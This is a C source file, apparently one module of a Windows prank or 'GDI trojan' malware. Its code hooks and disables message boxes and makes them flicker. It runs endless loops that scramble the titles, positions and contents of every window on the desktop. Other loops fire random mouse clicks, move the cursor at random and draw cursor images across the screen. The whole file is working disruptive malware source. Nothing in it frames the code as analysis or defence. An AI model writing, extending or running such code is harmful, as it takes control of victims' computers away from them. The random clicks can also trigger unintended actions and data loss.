#include "iii.h"

VOID
GetRandomPath(
	_Inout_ PWSTR szRandom,
	_In_ INT nLength
)
{
	for (INT i = 0; i < nLength; i++)
	{
		szRandom[i] = (WCHAR)(Xorshift32() % (0x9FFF - 0x4E00 + 1) + 0x4E00);
	}
}

BOOL
CALLBACK
MsgBoxRefreshWndProc(
	_In_ HWND   hwnd,
	_In_ LPARAM lParam
)
{
	UNREFERENCED_PARAMETER(lParam);
	RedrawWindow(hwnd, NULL, NULL, RDW_ERASE | RDW_INVALIDATE);
	return TRUE;
}

BOOL
CALLBACK
MsgBoxWndProc(
	_In_ HWND   hwnd,
	_In_ LPARAM lParam
)
{
	UNREFERENCED_PARAMETER(lParam);
	EnableWindow(hwnd, FALSE);
	SetWindowTextW(hwnd, L"Very well decision!");
	return TRUE;
}

VOID
WINAPI
MsgBoxCorruptionThread(
	_In_ HWND hwndMsgBox
)
{
	HANDLE hHeap;
	HDC hdcMsgBox;
	HDC hdcTempMsgBox;
	HBITMAP hBitmap;
	RECT rcMsgBox;
	INT w, h;

	GetWindowRect(hwndMsgBox, &rcMsgBox);
	w = rcMsgBox.right - rcMsgBox.left;
	h = rcMsgBox.bottom - rcMsgBox.top;

	hdcMsgBox = GetDC(hwndMsgBox);
	hdcTempMsgBox = CreateCompatibleDC(hdcMsgBox);

	hBitmap = CreateCompatibleBitmap(hdcMsgBox, w, h);
	SelectObject(hdcTempMsgBox, hBitmap);

	for (;; )
	{
		BitBlt(hdcTempMsgBox, 0, 0, w, h, hdcMsgBox, 0, 0, SRCCOPY);
		BitBlt(hdcMsgBox, 0, 0, w, h, hdcTempMsgBox, 0, 0, NOTSRCCOPY);
		EnumChildWindows(hwndMsgBox, MsgBoxRefreshWndProc, 0);
		Sleep(1000);
	}

	DeleteObject(hBitmap);
	DeleteDC(hdcTempMsgBox);
	ReleaseDC(hwndMsgBox, hdcMsgBox);
}

LRESULT
CALLBACK
MsgBoxHookProc(
	_In_ INT nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	HWND hwndMsgBox;

	if (nCode == HCBT_ACTIVATE)
	{
		hwndMsgBox = (HWND)wParam;

		ShowWindow(hwndMsgBox, SW_SHOW);

		EnumChildWindows(hwndMsgBox, MsgBoxWndProc, 0);
		CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);

		return 0;
	}

	return CallNextHookEx(hMsgHook, nCode, wParam, lParam);
}

VOID
WINAPI
MessageBoxThread(VOID)
{
	hMsgHook = SetWindowsHookExW(WH_CBT, MsgBoxHookProc, NULL, GetCurrentThreadId());
	MessageBoxW(NULL, L"Very well decision!", L"Very well decision!", MB_ABORTRETRYIGNORE | MB_ICONERROR);
	UnhookWindowsHookEx(hMsgHook);
}

BOOL
CALLBACK
GlobalWndProc(
	_In_ HWND   hwnd,
	_In_ LPARAM lParam
)
{
	BOOL bParent;
	HDC hdc;
	RECT rcOriginal;
	RECT rc;
	INT w;
	INT h;

	Sleep(10);

	WCHAR szWndText[256];
	for (INT i = 0; i < 256; i++)
	{
		szWndText[i] = (WCHAR)((Xorshift32() % 256) + 1);
	}

	SetWindowTextW(hwnd, szWndText);

	GetWindowRect(hwnd, &rcOriginal);

	rc = rcOriginal;

	rc.left += Xorshift32() % 3 - 1;
	rc.top += Xorshift32() % 3 - 1;
	rc.right += Xorshift32() % 3 - 1;
	rc.bottom += Xorshift32() % 3 - 1;

	w = rc.right - rc.left;
	h = rc.bottom - rc.top;

	MoveWindow(hwnd, rc.left, rc.top, w, h, TRUE);

	hdc = GetDC(hwnd);

	if (Xorshift32() % 2)
	{
		BitBlt(hdc, rc.left, rc.top, w, h, hdc, rcOriginal.left, rcOriginal.top, (Xorshift32() % 2) ? SRCAND : SRCPAINT);
	}
	else
	{
		w = rcOriginal.right - rcOriginal.left;
		h = rcOriginal.bottom - rcOriginal.top;
		StretchBlt(hdc, rcOriginal.left, rcOriginal.top, w, h, hdcDesktop, rcScrBounds.left, rcScrBounds.top,
			rcScrBounds.right - rcScrBounds.left, rcScrBounds.bottom - rcScrBounds.top,
			(Xorshift32() % 2) ? SRCAND : SRCPAINT);
	}

	ReleaseDC(hwnd, hdc);

	bParent = (BOOL)lParam;

	if (bParent)
	{
		EnumChildWindows(hwnd, GlobalWndProc, FALSE);
	}

	return TRUE;
}

VOID
WINAPI
EnumGlobalWnd(VOID)
{
	for (;; )
	{
		EnumWindows(GlobalWndProc, TRUE);
	}
}

VOID
WINAPI
CursorClicker(VOID)
{
	INT ppdwClickEvents[2][2] = {
		{ MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP },
		{ MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP }
	};

	for (;; )
	{
		INT nIndex = Xorshift32() % 2;

		mouse_event(ppdwClickEvents[nIndex][0], 0, 0, 0, 0);
		Sleep(Xorshift32() % 51 + 50);

		mouse_event(ppdwClickEvents[nIndex][1], 0, 0, 0, 0);
		Sleep(Xorshift32() % 51 + 50);
	}
}

VOID
WINAPI
CursorMess(VOID)
{
	for (;; )
	{
		SetCursorPos(Xorshift32() % (rcScrBounds.right - rcScrBounds.left) - rcScrBounds.left,
			Xorshift32() % (rcScrBounds.bottom - rcScrBounds.top) - rcScrBounds.top);
		Sleep(1000);
	}
}

VOID
WINAPI
CursorDraw(VOID)
{
	CURSORINFO curInf = { sizeof(CURSORINFO) };

	for (;; )
	{
		GetCursorInfo(&curInf);

		for (INT i = 0; i < (INT)(Xorshift32() % 5 + 1); i++)
		{
			DrawIcon(hdcDesktop, Xorshift32() % (rcScrBounds.right - rcScrBounds.left - GetSystemMetrics(SM_CXCURSOR)) - rcScrBounds.left,
				Xorshift32() % (rcScrBounds.bottom - rcScrBounds.top - GetSystemMetrics(SM_CYCURSOR)) - rcScrBounds.top, curInf.hCursor);
		}
		DestroyCursor(curInf.hCursor);
		Sleep(Xorshift32() % 11);
	}
}